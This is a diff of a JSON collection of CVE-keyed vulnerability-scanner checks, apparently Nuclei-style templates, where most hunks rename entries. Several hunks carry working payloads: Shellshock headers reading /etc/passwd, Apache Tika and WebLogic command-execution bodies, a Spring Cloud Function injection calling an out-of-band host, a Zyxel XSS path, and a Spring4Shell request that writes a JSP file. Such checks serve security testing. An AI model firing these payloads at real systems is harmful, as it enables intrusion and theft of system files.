@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -5912,7 +5912,7 @@
     {
       "id": "CVE-2018-11709",
       "info": {
-        "name": "wpForo Forum <= 1.4.11 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress wpForo Forum <= 1.4.11 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6145,11 +6145,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -7449,7 +7449,7 @@
     {
       "id": "CVE-2019-10068",
       "info": {
-        "name": "Kentico CMS Insecure Deserialization RCE",
+        "name": "Kentico CMS Insecure Deserialization Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7512,7 +7512,7 @@
     {
       "id": "CVE-2019-10232",
       "info": {
-        "name": "Pre-authenticated SQL injection in GLPI <= 9.3.3",
+        "name": "Teclib GLPI <= 9.3.3 Unauthenticated SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -7558,7 +7558,7 @@
     {
       "id": "CVE-2019-10758",
       "info": {
-        "name": "Mongo-Express Remote Code Execution - CVE-2019-10758",
+        "name": "mongo-express Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7602,7 +7602,7 @@
     {
       "id": "CVE-2019-11510",
       "info": {
-        "name": "Pulse Connect Secure SSL VPN arbitrary file read vulnerability",
+        "name": "Pulse Connect Secure SSL VPN Arbitrary File Read",
         "severity": "critical"
       },
       "requests": [
@@ -7617,7 +7617,7 @@
     {
       "id": "CVE-2019-11580",
       "info": {
-        "name": "Atlassian Crowd & Crowd Data Center - Unauthenticated RCE",
+        "name": "Atlassian Crowd and Crowd Data Center Unauthenticated Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7632,7 +7632,7 @@
     {
       "id": "CVE-2019-11581",
       "info": {
-        "name": "Atlassian Jira template injection",
+        "name": "Atlassian Jira Server-Side Template Injection",
         "severity": "critical"
       },
       "requests": [
@@ -7680,7 +7680,7 @@
     {
       "id": "CVE-2019-12314",
       "info": {
-        "name": "Deltek Maconomy 2.2.5 LFIl",
+        "name": "Deltek Maconomy 2.2.5 Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -7756,7 +7756,7 @@
     {
       "id": "CVE-2019-13101",
       "info": {
-        "name": "D-Link DIR-600M - Authentication Bypass",
+        "name": "D-Link DIR-600M Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -7998,7 +7998,7 @@
     {
       "id": "CVE-2019-15859",
       "info": {
-        "name": "Socomec DIRIS Password Disclosure",
+        "name": "Socomec DIRIS A-40 Devices Password Disclosure",
         "severity": "critical"
       },
       "requests": [
@@ -8076,7 +8076,7 @@
     {
       "id": "CVE-2019-16313",
       "info": {
-        "name": "ifw8 Router ROM v4.31 allows credential disclosure",
+        "name": "ifw8 Router ROM v4.31 Credential Discovery",
         "severity": "high"
       },
       "requests": [
@@ -8136,7 +8136,7 @@
     {
       "id": "CVE-2019-16662",
       "info": {
-        "name": "rConfig 3.9.2 - Remote Code Execution",
+        "name": "rConfig 3.9.2 Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -8151,7 +8151,7 @@
     {
       "id": "CVE-2019-16759",
       "info": {
-        "name": "RCE in vBulletin v5.0.0-v5.5.4 fix bypass",
+        "name": "vBulletin v5.0.0-v5.5.4 Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -9775,8 +9775,8 @@
         {
           "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Test-Header": "cat /etc/passwd"
+            "Test-Header": "cat /etc/passwd",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -14055,7 +14055,7 @@
     {
       "id": "CVE-2021-3017",
       "info": {
-        "name": "Intelbras WIN 300/WRN 342 Disclosure",
+        "name": "Intelbras WIN 300/WRN 342 Credential Disclosure",
         "severity": "high"
       },
       "requests": [
@@ -14913,7 +14913,7 @@
     {
       "id": "CVE-2021-37573",
       "info": {
-        "name": "Tiny Java Web Server - Reflected XSS",
+        "name": "Tiny Java Web Server - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14942,7 +14942,7 @@
     {
       "id": "CVE-2021-37704",
       "info": {
-        "name": "phpfastcache phpinfo exposure",
+        "name": "phpinfo Resource Exposure",
         "severity": "medium"
       },
       "requests": [
@@ -16096,6 +16096,21 @@
       ]
     },
     {
+      "id": "CVE-2021-46387",
+      "info": {
+        "name": "Zyxel ZyWALL 2 Plus Internet Security Appliance - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Forms/rpAuth_1?id=</form><iMg%20src=x%20onerror=\"prompt(document.domain)\"><form>"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0148",
       "info": {
         "name": "All-in-one Floating Contact Form < 2.0.4 - Authenticated Reflected XSS",
@@ -16316,6 +16331,21 @@
         {
           "raw": [
             "POST /functionRouter HTTP/1.1\nHost: {{Hostname}}\nspring.cloud.function.routing-expression: T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")\nContent-Type: application/x-www-form-urlencoded\n\n{{rand_base(8)}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-22965",
+      "info": {
+        "name": "Spring Framework RCE via Data Binding on JDK 9+ (Spring4Shell)",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nc2: <%\nsuffix: %>\n\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(%22j%22))%7B%20out.println(new%20String(%22SPRING_CORE_RCE%22))%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=checkexploit&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\n",
+            "GET /checkexploit.jsp HTTP/1.1\nHost: {{Hostname}}\nTest: {{wait_for(10)}}\n"
           ]
         }
       ]
